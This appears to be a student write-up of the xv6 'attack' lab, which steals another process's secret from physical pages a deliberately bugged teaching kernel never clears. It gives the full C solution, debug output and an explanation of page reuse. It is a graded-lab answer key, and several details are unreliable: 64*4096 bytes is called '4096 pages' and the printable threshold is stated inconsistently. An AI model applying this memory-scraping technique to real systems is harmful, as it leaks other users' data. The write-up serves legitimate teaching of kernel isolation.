## Attack xv6

> **ORIGINAL INSTRUCTION**
> 
> The xv6 kernel isolates user programs from each other and isolates the kernel from user programs. As you saw in the above assignments, an application cannot directly call a function in the kernel or in another user program; instead, interactions occur only through system calls. However, if there is a bug in the kernel's implementation of a system call, an attacker may be able to exploit that bug to break the isolation boundaries. To get a sense for how bugs can be exploited, we have introduced a bug into xv6 and your goal is to exploit that bug to steal a secret from another process.
> 
> The bug is that the call to `memset(mem, 0, sz)` in `uvmalloc()` in `kernel/vm.c` to clear a newly-allocated page is omitted when compiling this lab. Similarly, when compiling `kernel/kalloc.c` for this lab the two lines that use memset to put garbage into free pages are omitted. The net effect of omitting these 3 lines (all marked by `ifndef LAB_SYSCALL`) is that newly allocated memory retains the contents from its previous use. Thus an application that calls `sbrk()` to allocate memory may receive pages that have data in them from previous uses. Despite the 3 deleted lines, xv6 mostly works correctly; it even passes most of usertests.
> 
> `user/secret.c` writes a secret string in its memory and then exits (which frees its memory). Your goal is to add a few lines of code to `user/attack.c` to find the secret that a previous execution of `secret.c` wrote to memory, and to print the secret on a line by itself.
> 
> Your `attack.c` must work with unmodified xv6 and unmodified `secret.c`. You can change anything to help you experiment and debug, but must revert those changes before final testing and submitting.
> 
> The secret program takes the secret as an argument. You can test your attack program by running secret with some argument, then runing attack, and seeing whether attack prints exactly the argument passed to secret. Here's a successful run:
> 
> ```shell
> $ secret xyzzy
> $ attack
> xyzzy
> $
> ```
> 
> Depending on exactly how you implement your attack, you may need to run attack a second time in order for it to find the secret. The grader runs attack twice, just in case, and is satisfied if either produces the secret.
> 
> From outside xv6, you can use `./grade-lab-syscall` attack, or `make grade`, to see if your attack passes our tests. The secret strings that the tests generate are guaranteed to contain only digits and upper and lower case letters.
> 
> As with this example, bugs that do not directly affect correctness can sometimes be exploited to break security. Careful programming and extensive testing can reduce the number of bugs but can't guarantee their absence. xv6 has had bugs in the past, and probably has yet more undiscovered errors. Real kernels, which have much more code than xv6, have a long history of such bugs. For example, see the [public Linux vulnerabilities](https://www.opencve.io/cve?vendor=linux&product=linux_kernel) and [how to report vulnerabilities](https://docs.kernel.org/process/security-bugs.html).

### General idea

To fully understand what we need to do, we should understand how are the memory hierachy conducted.

This is the physical memory hierachy of xv6.

```
┌─────────────────────────────────┐ ← High addresses (0xFFFF...)
│         Kernel Space            │
│    (OS kernel, drivers, etc.)   │
├─────────────────────────────────┤
│         User Space              │
│    (User programs run here)     │
├─────────────────────────────────┤
│         Device Memory           │
│    (Memory-mapped I/O)          │
├─────────────────────────────────┤
│         RAM                     │
│    (Main system memory)         │
└─────────────────────────────────┘ ← Low addresses (0x0000...)
```

As we can see, for user programs, we can only use the `User Space` section. For each process, they have their own virtual memory space:

```
┌─────────────────────────────────┐ ← 0xFFFFFFFF (high)
│         Kernel Space            │ ← Only kernel can access
├─────────────────────────────────┤ ← 0x80000000
│         Stack                   │ ← Grows downward
│           ↓                     │   (local variables, function calls)
├─────────────────────────────────┤
│                                 │
│         Free Space              │ ← Available for allocation
│                                 │
├─────────────────────────────────┤
│           ↑                     │
│         Heap                    │ ← Grows upward
│    (malloc, sbrk allocations)   │   (sbrk() allocates here)
├─────────────────────────────────┤
│         BSS Segment             │ ← Uninitialized global/static vars
├─────────────────────────────────┤
│         Data Segment            │ ← Initialized global/static vars
├─────────────────────────────────┤
│         Text Segment            │ ← Program code + string literals
└─────────────────────────────────┘ ← 0x00000000 (low)
```

When a process acquire the memory for some data, according to the data types, they would be stored in different region of the virtual memory space. And virtual memory points to several (may be inconsistent) physical memory pages.

In this lab, the system is designed to hold a bug that it won't clear the physical memory page for a user process after it's terminated, but marking it as free memory. Therefore, the following process may get the old pages from the previous process containing the exact data unchanged when the previous process was running.

We will exploit this charastistic to find the `secret` left in the physical memory page. We can do this in the following steps:

1. Deliberately require a large chunk of memory.
2. Search through the memory to look for what we want.

### Allocate a large chunk of memory

```C
  #define SIZE (64 * 4096)

  char *addr = sbrk (SIZE);

    if (addr == (char *)-1)
    {
      printf ("attack: sbrk failed, not enough memory\n");
      exit (1);
    }
```

We can use `sbrk()` to require memory from heap. This chunk of memory is `4096 pages` large, and points to `4096` physical memory pages.

> This number is designed to be large enough to successfully search running in two times.

`sbrk()` will return the starting address of the newly allocated memory. If failed, it will return an address `-1`.

### Search through the memory to find matches

```C
#define SIZE (64 * 4096)
#define HELP_LENGTH 14

  for (int i = 0; i < SIZE - HELP_LENGTH; i++)
    {
      if (memcmp (&addr[i], "This may help.", HELP_LENGTH) == 0)
        {
          /* Do something ... */
        }
    }
```

We will search the chunk of memory byte by byte.

`memcmp()` will help us compare a specific length of memory. `This may help.` is `14` bytes, and the length is defined as a global variable `HELP_LENGTH`.

> Note that you can also compare `15` bytes in the `memcmp` (define HELP_LENGTH as 15). That's because the string we input and the string to be compared both include a null terminator. We are not counting the null terminator here.

```C
#define SIZE (64 * 4096)
#define HELP_LENGTH 14
#define MAXSTRLEN 256

for (int i = 0; i < SIZE - HELP_LENGTH; i++)
    {
      if (memcmp (&addr[i], "This may help.", HELP_LENGTH) == 0)
        {
          char buf[MAXSTRLEN] = { 0 };
          char *secret_ptr = &addr[i + 16];
          
          /* Existing code ... */
        }
    }
```

Once we find the helper string, we firstly declare and initialize a buffer `buf` to store the secret string. The size of this buffer is reasonably set in global variable `MAXSTRLEN`.

Then, we add `16` to `i` to mark the start of the probable secret string.

```C
#define SIZE (8 * 4096)
#define HELP_LENGTH 14
#define MAXSTRLEN 256

for (int i = 0; i < SIZE - HELP_LENGTH; i++)
    {
      if (memcmp (&addr[i], "This may help.", HELP_LENGTH) == 0)
        {
          char buf[MAXSTRLEN] = { 0 };
          char *secret_ptr = &addr[i + 16];

          int len = 0;

          int unprintable_count = 0;
          int unprintable_location[MAXSTRLEN] = { 0 };
          
          for (int j = 0; j < MAXSTRLEN && (i + 16 + j) < SIZE; j++)
            {
              char c = secret_ptr[j];
              if (c == 0)
                {
                  break;
                }
              if (c >= 32 && c <= 126) // if printable
                {
                  buf[len++] = c;
                }
              else
                {
                  unprintable_location[unprintable_count++] = len;
                  buf[len++] = c;
                }
            }
        }
    }

```

We record the data byte by byte into the `buf`, until the `char` representation of it hits number `0`, which marks the end of string.

> Note that `c == 0` doesn't mean that `c == '0'`. It indicates that the integer representation (the hex value) of `c` equals `0`, instead of `c` holding the character `'0'` in it.

We add an array `int unprintable_location[MAXSTRLEN]` to log the location of unprintable character. When encounter an unprintable character (`c < 36 || c > 126`), it would still be stored into the `buf`, but with its location logged.

### Print out the `buf`

```C

#define SIZE (8 * 4096)
#define HELP_LENGTH 14
#define MAXSTRLEN 256

for (int i = 0; i < SIZE - HELP_LENGTH; i++)
    {
      if (memcmp (&addr[i], "This may help.", HELP_LENGTH) == 0)
        {
          char buf[MAXSTRLEN] = { 0 };
          char *secret_ptr = &addr[i + 16];

          int len = 0;

          int unprintable_count = 0;
          int unprintable_location[MAXSTRLEN] = { 0 };
          
          for (int j = 0; j < MAXSTRLEN && (i + 16 + j) < SIZE; j++)
            {
              char c = secret_ptr[j];
              if (c == 0)
                {
                  break;
                }
              if (c >= 32 && c <= 126) // if printable
                {
                  buf[len++] = c;
                }
              else
                {
                  unprintable_location[unprintable_count++] = len;
                  buf[len++] = c;
                }
            }

            if (len == 0)
            {
              printf ("attack: keyword found but no printable data, try run "
                      "attack again\n");
              exit (0);
            }
          else if (unprintable_count != 0)
            {
              printf ("attack: WARNING, output contains %d unprintable "
                      "characters. Location at: ",
                      unprintable_count);
              for (int index = 0; index < unprintable_count; index++)
                {
                  printf ("%d ", unprintable_location[index]);
                }
              printf ("\n");
              buf[len] = 0;
              for (int k = 0; k < len; k++)
                {
                  printf ("%c", buf[k]);
                }
              printf ("\n");
              exit (0);
            }
          else
            {
              buf[len] = 0;
              for (int k = 0; k < len; k++)
                {
                  printf ("%c", buf[k]);
                }
              printf ("\n");
              exit (0);
            }
        }
    }

  printf ("attack: string not found, SIZE might be too small, or try run attack again\n");
  exit (0);

```

If `len == 0`, it means that after the string `"This may help.\0"`, there's another `\0`. There's no data to print. The reason why running `attack` again do works will be discussed [below]().

If there's unprintable characters, we will first print out a warning and the logged location of unprintable characters in the string. Then, we do the normal print procedure.

The normal print procedure will print out the `buf` character by character, and then exit the program normally.

If the program walk through the whole for loop and finds nothing, an error message will be printed, indicating that this run of `attack` failed to find the string. This could either because the `SIZE` of allocated memory is too small, or the physical page allocated to this attack run simply doesn't contain the leftover data of `secret`.

### Why `attack` needs to be executed twice?

If you implement the program in the above way, you may find out that the first run of `attack` simply gives an output of `(null)`, and the second time will succeed. The image below demonstrates this phenomenon:

![WIKILabattackResult](https://github.com/user-attachments/assets/23ce58b8-48f7-4ab1-b242-1f5d0ea06ef1)

To understand what happened here, we insert the debugging code:

```C
#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define SIZE (64 * 4096)
#define HELP_LENGTH 14
#define MAXSTRLEN 256
#define DEBUGLEN 64

int
main (int argc, char *argv[])
{
  char *addr = sbrk (SIZE);

  if (addr == (char *)-1)
    {
      printf ("attack: sbrk failed, not enough memory\n");
      exit (1);
    }

  for (int i = 0; i < SIZE - HELP_LENGTH; i++)
    {
      if (memcmp (&addr[i], "This may help.", HELP_LENGTH) == 0)
        {
          char buf[MAXSTRLEN] = { 0 };
          char *secret_ptr = &addr[i + 16];
          int len = 0;
          int unprintable_count = 0;
          int unprintable_location[MAXSTRLEN] = { 0 };

          // Debug section
          printf ("DEBUG SECTION----------------------\n");
          printf ("Found marker at offset %d\n", i);
          printf ("Raw bytes at +16: ");
          for (int debug = i; debug < DEBUGLEN + i; debug++)
            {
              printf ("%x ", (unsigned char)addr[debug]);
            }
          printf ("\nASCII: ");
          for (int debug = i; debug < DEBUGLEN + i; debug++)
            {
              printf ("%c ", (unsigned char)addr[debug]);
            }
          printf ("\n");
          // Debug section ends

          for (int j = 0; j < MAXSTRLEN && (i + 16 + j) < SIZE; j++)
            {
              char c = secret_ptr[j];
              if (c == 0)
                {
                  break;
                }
              if (c >= 32 && c <= 126) // if printable
                {
                  buf[len++] = c;
                }
              else
                {
                  unprintable_location[unprintable_count++] = len;
                  buf[len++] = c;
                }
            }

          // Debug section
          printf ("Extracted %d characters\n", len);
          printf ("DEBUG SECTION ENDS----------------------\n");
          // Debug section ends

          if (len == 0)
            {
              printf ("attack: keyword found but no printable data, try run "
                      "attack again. If attack succeeded before, running it "
                      "again will also rise this error message\n");
              exit (0);
            }
          else if (unprintable_count != 0)
            {
              printf ("attack: WARNING, output contains %d unprintable "
                      "characters. Location at: ",
                      unprintable_count);
              for (int index = 0; index < unprintable_count; index++)
                {
                  printf ("%d ", unprintable_location[index]);
                }
              printf ("\n");
              buf[len] = 0;
              for (int k = 0; k < len; k++)
                {
                  printf ("%c", buf[k]);
                }
              printf ("\n");
              exit (0);
            }
          else
            {
              buf[len] = 0;
              for (int k = 0; k < len; k++)
                {
                  printf ("%c", buf[k]);
                }
              printf ("\n");
              exit (0);
            }
        }
    }

  printf ("attack: string not found, SIZE might be too small, or try run "
          "attack again\n");
  exit (0);
}

```

The code in the debug section will print the raw byte data (in hex) starting from the location of `"This may help."`, and also the `char` representation of it.

Running the code again, we get:

![WIKILabattackDebug](https://github.com/user-attachments/assets/11a86826-df31-449d-ad07-4377ef76cf78)

The `(null)` that prints is actually from the `printf()` function.

Looking at `/user/printf.c`, we can see the following two strings:

```C
static char digits[] = "0123456789ABCDEF";
/* Existing code ... */
s = "(null)";
```

This kind of strings are stored in a special region of memory space, so does the string in `attack.c`:

```C
if (memcmp (&addr[i], "This may help.", HELP_LENGTH) == 0)
```

The first run of `attack` actually hits its own string stored in the pages, and the second run hits the address space of previous `secret`.

If we make global variable `SIZE` a really big number, and then run the `attack` for multiple times, we will see that:

```shell
xv6 kernel is booting

hart 1 starting
hart 2 starting
init: starting sh
$ secret adfawdfa
$ attack
DEBUG SECTION----------------------
Found marker at offset 67888
Raw bytes at +16: 54 68 69 73 20 6D 61 79 20 68 65 6C 70 2E 0 0 28 6E 75 6C 6C 29 0 0 30 31 32 33 34 35 36 37 38 39 41 42 43 44 45 46 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
ASCII: T h i s   m a y   h e l p .   ( n u l l )   0 1 2 3 4 5 6 7 8 9 A B C D E F                         
Extracted 6 characters
DEBUG SECTION ENDS----------------------
(null)
$ attack
DEBUG SECTION----------------------
Found marker at offset 33464336
Raw bytes at +16: 54 68 69 73 20 6D 61 79 20 68 65 6C 70 2E 0 0 61 64 66 61 77 64 66 61 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
ASCII: T h i s   m a y   h e l p .   a d f a w d f a                                         
Extracted 8 characters
DEBUG SECTION ENDS----------------------
adfawdfa
$ attack
DEBUG SECTION----------------------
Found marker at offset 43928
Raw bytes at +16: 54 68 69 73 20 6D 61 79 20 68 65 6C 70 2E 0 0 0 0 0 0 0 0 0 0 44 45 42 55 47 20 53 45 43 54 49 4F 4E 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D A 0 0 0 0 
ASCII: T h i s   m a y   h e l p .           D E B U G   S E C T I O N - - - - - - - - - - - - - - - - - - - - - - 
     
Extracted 0 characters
DEBUG SECTION ENDS----------------------
attack: keyword found but no printable data, try run attack again. If attack succeeded before, running it again will also rise this error message
$ attack
DEBUG SECTION----------------------
Found marker at offset 43928
Raw bytes at +16: 54 68 69 73 20 6D 61 79 20 68 65 6C 70 2E 0 0 0 0 0 0 0 0 0 0 44 45 42 55 47 20 53 45 43 54 49 4F 4E 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D A 0 0 0 0 
ASCII: T h i s   m a y   h e l p .           D E B U G   S E C T I O N - - - - - - - - - - - - - - - - - - - - - - 
     
Extracted 0 characters
DEBUG SECTION ENDS----------------------
attack: keyword found but no printable data, try run attack again. If attack succeeded before, running it again will also rise this error message
$ 

```



Let's analyze what happened in each run:

**First `attack` run:**
- Found marker at offset `67888`
- Raw bytes at `+16` show: `28 6E 75 6C 6C 29` which translates to ASCII `(null)`
- This is followed by `30 31 32 33...` (`0123456789ABCDEF`), which is the `digits` array from `printf.c`
- **Result**: `attack` found its own text segment strings, not the secret

**Second `attack` run:**
- Found marker at offset `33464336` (much further in memory)
- Raw bytes at `+16` show: `61 64 66 61 77 64 66 61` which translates to ASCII `adfawdfa`
- **Result**: Successfully found the secret from the previous `secret` process!

**Third and fourth `attack` runs:**
- Found marker at offset `43928`
- Raw bytes at `+16` show only null bytes (`0 0 0 0...`) followed by `44 45 42...` (`DEBUG SECTION...`)
- This is finding the debug string from the previous `attack` run
- **Result**: No printable data after the marker, so `len == 0`

#### Understanding the Memory Reuse Pattern

This demonstrates the core exploitation mechanism:

1. **Why the first run often fails**: When `attack` first runs (for the very first time after `secret`), it allocates heap memory via `sbrk()`. Due to memory allocation patterns, it may receive pages that either:
   - Were never used before (contain zeros or random data)
   - Contain leftover data from `secret` or other recently-freed pages
   - Contain `attack`'s own text segment strings (see explanation below)

> **Q: How can the FIRST run of `attack` find its own text segment strings in `sbrk()`-allocated heap? The text segment is still in use!**
>
> **A:**
>
> The key is understanding what happens during `exec()`:
>
> **Step 1: Text segment allocation (`/kernel/exec.c` lines 59-75)**
> ```c
> // Allocate memory for segment (ph.memsz bytes)
> uvmalloc(pagetable, sz, ph.vaddr + ph.memsz, ...)  // Line 71
> 
> // But only load ph.filesz bytes from file
> loadseg(pagetable, ph.vaddr, ip, ph.off, ph.filesz)  // Line 74
> ```
>
> **Step 2: What `uvmalloc()` does (`/kernel/vm.c` lines 252-281)**
> ```c
> mem = kalloc();  // Allocates physical page from free list (line 265)
> #ifndef LAB_SYSCALL
>   memset(mem, 0, sz);  // Would clear it, but DISABLED in this lab!
> #endif
> ```
>
> **The exploitation mechanism for the FIRST run:**
>
> 1. When `exec("attack")` runs, it calls `uvmalloc()` to allocate pages for the text segment
> 2. `uvmalloc()` calls `kalloc()`, which returns pages from the free list - these may contain data from `secret` or other recently exited processes
> 3. Due to the bug (`memset` is disabled), these pages are NOT cleared
> 4. `loadseg()` then reads the `attack` binary and overwrites PART of these pages with `attack`'s actual code and data
> 5. However, **any portion of allocated pages not overwritten by `loadseg()` still contains the old garbage data**
> 6. When `attack` immediately calls `sbrk()` for heap allocation, `kalloc()` returns **more pages from the free list**
> 7. These heap pages likely contain remnants from `secret` (or from the pages `exec` allocated but partially used)
>
> **Why it often finds `attack`'s own strings first:**
> The debug output shows `"(null)"` and `"0123456789ABCDEF"` - these are from `printf.c`, not `attack.c`! The `attack` binary was linked with `printf.o`, so `printf`'s text segment was also loaded. The partially-filled pages from loading `attack`+`printf` may have been freed/reallocated in a pattern where `sbrk()` gets pages containing `printf`'s strings rather than `secret`'s data.
   
2. **Why the second run often succeeds**: After the first `attack` terminates, its pages (including text segment) are freed. When the second `attack` runs and calls `sbrk()`, it has a higher chance of receiving the physical pages that `secret` used, because:
   - The first `attack` "churned" the memory pool
   - Physical pages from `secret` are now more likely to be allocated
   - The memory allocator may follow a pattern that makes reuse more likely

3. **Why subsequent runs may fail again**: Once `attack` succeeds and finds the secret, running it again may cause it to find its own previous debug output strings instead of the secret, since those are now the most recently freed pages.

Remember that xv6 hands *all* of a process's physical pages back to the same free list when the process exits—including the pages that held its text and read-only data when `exec` loaded the program. Later `sbrk()` calls simply recycle whatever physical pages are available, so heap allocations can expose leftovers from former text pages.

This behavior illustrates an important security principle: **memory must be explicitly cleared** when freed, or sensitive data can leak between processes. The bug in this lab (omitting `memset()` calls) creates exactly this vulnerability.